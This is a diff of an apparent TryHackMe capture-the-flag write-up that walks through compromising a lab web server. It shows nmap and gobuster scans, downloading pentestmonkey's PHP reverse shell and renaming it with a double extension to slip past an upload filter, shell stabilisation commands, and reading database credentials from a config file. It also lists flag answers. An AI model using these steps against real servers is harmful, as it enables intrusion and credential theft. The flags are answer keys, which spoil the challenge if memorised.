@@ -16,7 +16,7 @@ description: Web
 nmap -sC -sV -T5 -p1-65535 10.10.243.219
 ```
 
-![](../.gitbook/assets/image%20%28365%29.png)
+![](../.gitbook/assets/image%20%28366%29.png)
 
 {% hint style="success" %}
 80, 65000
@@ -28,7 +28,7 @@ nmap -sC -sV -T5 -p1-65535 10.10.243.219
 gobuster dir -u http://10.10.243.219 -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![](../.gitbook/assets/image%20%28368%29.png)
+![](../.gitbook/assets/image%20%28369%29.png)
 
 ```text
 gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
@@ -68,47 +68,67 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 mv php-reverse-shell.php image.jpeg.php
 ```
 
-![](../.gitbook/assets/image%20%28363%29.png)
-
-![](../.gitbook/assets/image%20%28366%29.png)
-
 ![](../.gitbook/assets/image%20%28364%29.png)
+
+![](../.gitbook/assets/image%20%28367%29.png)
+
+![](../.gitbook/assets/image%20%28365%29.png)
 
 {% hint style="success" %}
 No answer needed
 {% endhint %}
 
-What is the value of the web.txt flag?
+### What is the value of the web.txt flag?
 
 
 
-![](../.gitbook/assets/image%20%28362%29.png)
+![](../.gitbook/assets/image%20%28363%29.png)
 
 {% hint style="success" %}
 THM{ENTER\_THE\_GRID}
 {% endhint %}
 
-Upgrade and stabilize your shell.
+### Upgrade and stabilize your shell.
+
+```text
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+```
+
+{% hint style="success" %}
+No answer needed
+{% endhint %}
+
+### Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? **username:password**
+
+```text
+cd /var/www/
+cd TheGrid
+cd includes
+cat dbauth.php
+```
+
+![](../.gitbook/assets/image%20%28362%29.png)
+
+{% hint style="success" %}
+tron:IFightForTheUsers
+{% endhint %}
+
+### Access the database and discover the encrypted credentials. What is the name of the database you find these in?
 
 
 
-Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? **username:password**
-
-\*\*\*\*
-
-Access the database and discover the encrypted credentials. What is the name of the database you find these in?
+### Crack the password. What is it?
 
 
 
-Crack the password. What is it?
+### Use su to login to the newly discovered user by exploiting password reuse.
 
 
 
-Use su to login to the newly discovered user by exploiting password reuse.
-
-
-
-What is the value of the user.txt flag?
+### What is the value of the user.txt flag?
 
 
 
